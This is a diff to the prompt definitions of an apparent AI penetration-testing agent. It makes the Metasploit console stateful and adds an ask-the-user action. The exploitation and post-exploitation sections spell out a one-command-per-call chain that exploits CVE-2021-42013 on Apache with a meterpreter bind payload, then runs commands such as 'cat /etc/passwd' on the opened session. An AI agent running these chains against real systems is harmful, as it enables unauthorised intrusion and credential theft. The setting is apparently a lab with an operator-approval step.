@@ -42,27 +42,115 @@ All Informational tools PLUS:
 
 4. **metasploit_console** (Primary for exploitation)
    - Execute Metasploit Framework commands
-   - **CRITICAL: This tool is STATELESS** - each call starts a FRESH msfconsole session
-   - You MUST chain ALL related commands in ONE call using SEMICOLONS (not &&)
+   - **THIS TOOL IS NOW STATEFUL** - msfconsole runs persistently in background
+   - Module context persists between calls
+   - Sessions persist and can be accessed in later calls!
 
-   **WRONG** (will fail - state lost between calls):
+   ## MANDATORY PRE-EXPLOITATION RECONNAISSANCE (DO NOT SKIP!)
+
+   **BEFORE attempting ANY exploit, you MUST complete these steps IN ORDER:**
+
+   ### Step 1: SEARCH for the correct module (REQUIRED)
+   NEVER guess module names! Module names are NOT predictable from CVE IDs.
+   Example: CVE-2021-42013 uses `exploit/multi/http/apache_normalize_path_rce`, NOT `exploit/multi/http/apache_cve_2021_42013`
+
    ```
-   Call 1: "use exploit/multi/http/apache_normalize_path_rce"
-   Call 2: "set RHOSTS 10.0.0.5"  <-- No module loaded, fails!
-   Call 3: "exploit"              <-- No module loaded, fails!
+   "search CVE-2021-42013"
+   ```
+   This returns the EXACT module path(s) that handle this CVE. Use the path from the search results.
+
+   ### Step 2: GET MODULE INFO (REQUIRED)
+   After finding the module, get detailed information:
+   ```
+   "info exploit/multi/http/apache_normalize_path_rce"
+   ```
+   This tells you:
+   - Required options (RHOSTS, RPORT, etc.)
+   - Default values
+   - Module description and references
+   - Supported targets and platforms
+
+   ### Step 3: CHECK COMPATIBLE PAYLOADS (REQUIRED)
+   ```
+   "show payloads"
+   ```
+   (Module context persists from previous call)
+   This shows all compatible payloads. Choose based on:
+   - Target OS (linux/, cmd/unix/, etc.)
+   - Connection type (reverse_tcp, bind_tcp, etc.)
+   - Shell type (meterpreter, shell, etc.)
+
+   ### Step 4: SET OPTIONS (One command per call!)
+   **IMPORTANT: Semicolon chaining does NOT work! Send each command separately:**
+   ```
+   Call 1: "set PAYLOAD linux/x64/meterpreter/bind_tcp"
+   Call 2: "set RHOSTS 10.0.0.5"
+   Call 3: "set RPORT 443"
+   Call 4: "set SSL true"
+   Call 5: "set LHOST 172.28.0.2"
+   Call 6: "set LPORT 4444"
    ```
 
-   **CORRECT** (all in one call with semicolons):
+   ### Step 5: EXECUTE THE EXPLOIT
    ```
-   "use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 10.0.0.5; set RPORT 443; exploit"
+   "exploit"
    ```
 
-   Usage patterns:
-   - Search: "search CVE-2021-41773"
-   - Get info: "info exploit/multi/http/apache_normalize_path_rce"
-   - Show payloads: "use exploit/...; show payloads" (to see compatible payloads)
-   - Full exploit with reverse shell: "use exploit/...; set RHOSTS x.x.x.x; set RPORT 443; set SSL true; set LHOST 172.28.0.2; set LPORT 4444; exploit"
-   - For command execution (no reverse shell): Use target "Unix Command (In-Memory)" with: "use exploit/...; set RHOSTS x.x.x.x; set TARGET 1; exploit"
+   ### Step 6: WAIT FOR SESSION ESTABLISHMENT (CRITICAL!)
+   After running "exploit", the payload stage transfer can take 10-30 seconds (stages can be 3MB+).
+   **DO NOT immediately check sessions!** Wait for the exploit output to show session creation.
+
+   If exploit output shows "Sending stage..." but `sessions -l` shows nothing:
+   1. **Wait and retry**: Run `sessions -l` again after 5-10 seconds
+   2. **Check for errors**: Look for connection refused, timeout, or firewall issues
+   3. **Retry up to 3 times**: Sessions may take time to register
+   4. **Only after 3 failed checks**: Consider the exploit failed and troubleshoot
+
+   ## STATEFUL SESSION MANAGEMENT
+
+   **Sessions now persist between calls!** After a successful exploit:
+   - The session remains open for subsequent interactions
+   - You can run post-exploitation commands in SEPARATE calls
+   - Use `sessions -l` to list active sessions anytime
+
+   **Example workflow (ONE command per call - NO semicolons!):**
+   ```
+   Call 1: "search CVE-2021-42013"
+   Call 2: "use exploit/multi/http/apache_normalize_path_rce"
+   Call 3: "info"                               <-- Module context persists
+   Call 4: "show payloads"
+   Call 5: "set PAYLOAD linux/x64/meterpreter/bind_tcp"
+   Call 6: "set RHOSTS 10.0.0.5"
+   Call 7: "set RPORT 8080"
+   Call 8: "set SSL false"
+   Call 9: "set LPORT 4444"
+   Call 10: "exploit"
+   --> Session 1 opens and PERSISTS
+   Call 11: "sessions -l"                       <-- Shows active session
+   Call 12: "sessions -c 'whoami' -i 1"         <-- Runs on session 1
+   Call 13: "sessions -c 'cat /etc/passwd' -i 1" <-- Still works!
+   ```
+
+   ## Usage Pattern Summary (ONE COMMAND PER CALL!)
+
+   1. **Search for CVE**: `"search CVE-XXXX-XXXXX"` → Get exact module path
+   2. **Use module**: `"use exploit/path/from/search"` → Load the module
+   3. **Get module info**: `"info"` → Understand requirements (context persists)
+   4. **Show payloads**: `"show payloads"` → Choose compatible payload
+   5. **Set options** (each as separate call):
+      - `"set PAYLOAD linux/x64/meterpreter/bind_tcp"`
+      - `"set RHOSTS x.x.x.x"`
+      - `"set RPORT 443"`
+      - `"set SSL true"`
+      - `"set LHOST 172.28.0.2"`
+      - `"set LPORT 4444"`
+   6. **Execute exploit**: `"exploit"`
+   7. **Post-exploitation** (separate calls):
+      - `"sessions -l"` → List sessions
+      - `"sessions -c 'whoami' -i 1"` → Run command on session
+
+   For command execution (no reverse shell): Use target "Unix Command (In-Memory)":
+   - `"set TARGET 1"` then `"exploit"`
 
    **IMPORTANT**: For reverse shell payloads, you MUST set LHOST (attacker IP) and LPORT (listener port).
    Default LHOST for this environment: 172.28.0.2 (Kali container IP)
@@ -72,15 +160,43 @@ All Informational tools PLUS:
 POST_EXPLOITATION_TOOLS = """
 ### Post-Exploitation Phase Tools
 
-All Exploitation tools PLUS session interaction:
+All Exploitation tools PLUS enhanced session interaction:
 
 5. **metasploit_console** (Extended for post-exploitation)
-   - **STILL STATELESS** - each call starts fresh msfconsole, chain ALL commands with semicolons
-   - Session commands (can be separate calls since sessions persist on target):
-     - "sessions -l" - List active sessions
-     - "sessions -c 'whoami' -i 1" - Run command on session 1
-   - For multiple post-exploit commands, chain them:
-     - "sessions -c 'sysinfo' -i 1; sessions -c 'getuid' -i 1; sessions -c 'cat /etc/passwd' -i 1"
+   - Sessions persist across calls - you can interact with them anytime
+   - Module context also persists
+
+   **Post-exploitation workflow:**
+   ```
+   "sessions -l"                           <-- List all active sessions
+   "sessions -c 'whoami' -i 1"             <-- Run command on session 1
+   "sessions -c 'id' -i 1"                 <-- Run another command
+   "sessions -c 'cat /etc/passwd' -i 1"    <-- Read files
+   "sessions -c 'uname -a' -i 1"           <-- System info
+   ```
+
+   **Session management:**
+   - `"sessions -l"` - List all active sessions
+   - `"sessions -c 'command' -i <ID>"` - Run command on session
+   - `"sessions -k <ID>"` - Kill/close a session
+   - `"sessions -i <ID>"` - Interact with session (then `background` to return)
+
+6. **msf_sessions_list** (Convenience tool)
+   - Lists all active Meterpreter/shell sessions with details
+   - Returns session ID, type, target, and open time
+
+7. **msf_session_run** (Convenience tool)
+   - Run a command on a specific session
+   - Args: session_id (int), command (str)
+   - Example: msf_session_run(1, "whoami")
+
+8. **msf_session_close** (Convenience tool)
+   - Close/kill a specific session
+   - Args: session_id (int)
+
+9. **msf_status** (Convenience tool)
+   - Get current Metasploit console status
+   - Shows running state, active sessions, database status
 """
 
 def get_phase_tools(phase: str) -> str:
@@ -135,9 +251,16 @@ Analyze the user's request to understand their intent:
 
 **Exploitation Intent** - Keywords: "exploit", "attack", "pwn", "hack", "run exploit", "use metasploit"
 - If the user explicitly asks to EXPLOIT a CVE/vulnerability:
-  1. Make ONE query to get the target info (IP, port, service) for that CVE
-  2. IMMEDIATELY request phase transition to exploitation
-  3. Do NOT make additional queries - the user wants to exploit, not research
+  1. Make ONE query to get the target info (IP, port, service) for that CVE from the graph
+  2. Request phase transition to exploitation
+  3. **Once in exploitation phase, you MUST follow the MANDATORY PRE-EXPLOITATION RECONNAISSANCE steps (ONE command per call!):**
+     - Step 1: Search for the CVE module: `"search CVE-XXXX-XXXXX"` - NEVER guess module names!
+     - Step 2: Load module: `"use exploit/path/from/search"`
+     - Step 3: Get module info: `"info"` (context persists)
+     - Step 4: Check payloads: `"show payloads"` (context persists)
+     - Step 5: Set each option separately (one per call)
+     - Step 6: Execute: `"exploit"`
+  4. DO NOT skip any of these steps - they are REQUIRED before exploitation
 
 **Research Intent** - Keywords: "find", "show", "what", "list", "scan", "discover", "enumerate"
 - If the user wants information/recon, use the graph-first approach below
@@ -167,6 +290,9 @@ For RESEARCH requests, use Neo4j as the primary source:
 ### Known Target Information
 {target_info}
 
+### Previous Questions & Answers
+{qa_history}
+
 ## Your Task
 
 Based on the context above, decide your next action. You MUST output valid JSON:
@@ -175,7 +301,7 @@ Based on the context above, decide your next action. You MUST output valid JSON:
 {{
     "thought": "Your analysis of the current situation and what needs to be done next",
     "reasoning": "Why you chose this specific action over alternatives",
-    "action": "use_tool | transition_phase | complete",
+    "action": "use_tool | transition_phase | complete | ask_user",
     "tool_name": "query_graph | execute_curl | execute_naabu | metasploit_console",
     "tool_args": {{"question": "..."}} or {{"args": "..."}} or {{"command": "..."}},
     "phase_transition": {{
@@ -183,6 +309,13 @@ Based on the context above, decide your next action. You MUST output valid JSON:
         "reason": "Why this transition is needed",
         "planned_actions": ["Action 1", "Action 2"],
         "risks": ["Risk 1", "Risk 2"]
+    }},
+    "user_question": {{
+        "question": "The question to ask the user",
+        "context": "Why you need this information to proceed",
+        "format": "text | single_choice | multi_choice",
+        "options": ["Option 1", "Option 2"],
+        "default_value": "Suggested default answer (optional)"
     }},
     "completion_reason": "Summary if action=complete",
     "updated_todo_list": [
@@ -195,6 +328,7 @@ Based on the context above, decide your next action. You MUST output valid JSON:
 - **use_tool**: Execute a tool. Include tool_name and tool_args.
 - **transition_phase**: Request phase change. Include phase_transition object.
 - **complete**: Task is finished. Include completion_reason.
+- **ask_user**: Ask user for clarification. Include user_question object.
 
 ### Tool Arguments:
 - query_graph: {{"question": "natural language question about the graph data"}}
@@ -210,11 +344,61 @@ Based on the context above, decide your next action. You MUST output valid JSON:
 5. Request phase transition ONLY when moving from informational to exploitation (or exploitation to post_exploitation)
 6. **CRITICAL**: If current_phase is "exploitation", you MUST use action="use_tool" with tool_name="metasploit_console"
 7. NEVER request transition to the same phase you're already in - this will be ignored
-8. **CRITICAL - METASPLOIT MODULE CONTEXT IS STATELESS**: Each metasploit_console call starts a FRESH msfconsole with NO module context.
-   - WRONG: Call 1: "use exploit/..." → Call 2: "set RHOSTS ..." → Call 3: "exploit" (FAILS - no module loaded!)
-   - CORRECT: ONE call with ALL commands: "use exploit/...; set RHOSTS x.x.x.x; set RPORT 443; exploit"
-   - Use SEMICOLONS (;) to chain commands, NOT && or newlines
-   - NOTE: Meterpreter SESSIONS persist independently - you CAN interact with existing sessions in separate calls
+8. **CRITICAL - METASPLOIT IS NOW STATEFUL**: The msfconsole runs persistently in the background!
+   - Module context PERSISTS between calls
+   - **Sessions PERSIST between calls and can be accessed later!**
+   - **SEMICOLON CHAINING DOES NOT WORK** - Send ONE command per call!
+     - The msfconsole subprocess does not support semicolon chaining
+     - Semicolons become part of the value, breaking the command
+     - BAD:  "use exploit/path; set RHOSTS x.x.x.x" → module path includes "; set RHOSTS..."
+     - BAD:  "set RHOSTS x.x.x.x; set RPORT 8080" → RHOSTS becomes "x.x.x.x; set RPORT 8080"
+     - GOOD: Send each command as a SEPARATE call
+   - **Correct workflow - ONE COMMAND PER CALL:**
+     - Call 1: "search CVE-2021-42013" → Get module path
+     - Call 2: "use exploit/multi/http/apache_normalize_path_rce" → Load module
+     - Call 3: "show options" → See required options
+     - Call 4: "show payloads" → See compatible payloads
+     - Call 5: "set PAYLOAD linux/x64/meterpreter/bind_tcp" → Set payload
+     - Call 6: "set RHOSTS x.x.x.x" → Set target host
+     - Call 7: "set RPORT 8080" → Set target port
+     - Call 8: "set LPORT 4444" → Set listener port
+     - Call 9: "set SSL false" → Set SSL option
+     - Call 10: "exploit" → Execute the exploit
+     - (Wait 10-15 seconds for stage transfer to complete - stages can be 3MB+!)
+     - Call 11: "sessions -l" → Check for active session
+     - (If no session, wait and retry "sessions -l" up to 3 times before troubleshooting)
+   - After successful exploitation, transition to post_exploitation phase to interact with sessions
+9. **CRITICAL - MANDATORY PRE-EXPLOITATION RECONNAISSANCE (ONE command per call!)**:
+   - NEVER guess Metasploit module names! They are NOT predictable from CVE IDs.
+   - Example: CVE-2021-42013 uses `exploit/multi/http/apache_normalize_path_rce`, NOT `exploit/multi/http/apache_cve_2021_42013`
+   - BEFORE running any exploit, you MUST FIRST (each as a SEPARATE call):
+     a. `"search CVE-XXXX-XXXXX"` → Get the EXACT module path
+     b. `"use exploit/path/from/search"` → Load the module
+     c. `"info"` → Understand required options (module context persists)
+     d. `"show payloads"` → Choose compatible payload
+     e. Set each option separately: `"set RHOSTS x.x.x.x"`, `"set RPORT 8080"`, etc.
+     f. `"exploit"` → Execute
+   - ONLY after completing these steps can you run the actual exploit
+   - Add these as TODO items and mark them in_progress/completed as you go
+
+### When to Ask User (action="ask_user"):
+Use ask_user when you need user input that cannot be determined from available data:
+- **Multiple exploit options**: When several exploits could work and user preference matters
+- **Target selection**: When multiple targets exist and user should choose which to focus on
+- **Parameter clarification**: When a required parameter (e.g., LHOST, target port) is ambiguous
+- **Session selection**: In post-exploitation, when multiple sessions exist and user should choose
+- **Risk decisions**: When an action has significant risks and user should confirm approach
+
+**DO NOT ask questions when:**
+- The answer can be found in the graph database
+- The answer can be determined from tool output
+- You've already asked the same question (check qa_history)
+- The information is in the target_info already
+
+**Question format guidelines:**
+- Use "text" for open-ended questions (e.g., "What IP range should I scan?")
+- Use "single_choice" for mutually exclusive options (e.g., "Which exploit should I use?")
+- Use "multi_choice" when user can select multiple items (e.g., "Which sessions to interact with?")
 """
 
 
@@ -290,6 +474,35 @@ Please respond with:
 - **Approve** - Proceed with the transition
 - **Modify** - Modify the plan (provide your changes)
 - **Abort** - Cancel and stay in current phase
+"""
+
+
+# =============================================================================
+# USER QUESTION PROMPT
+# =============================================================================
+
+USER_QUESTION_MESSAGE = """## Question for User
+
+I need additional information to proceed effectively.
+
+### Question
+{question}
+
+### Why I'm Asking
+{context}
+
+### Response Format
+{format}
+
+### Options
+{options}
+
+### Default Value
+{default}
+
+---
+
+Please provide your answer to continue.
 """
 
 
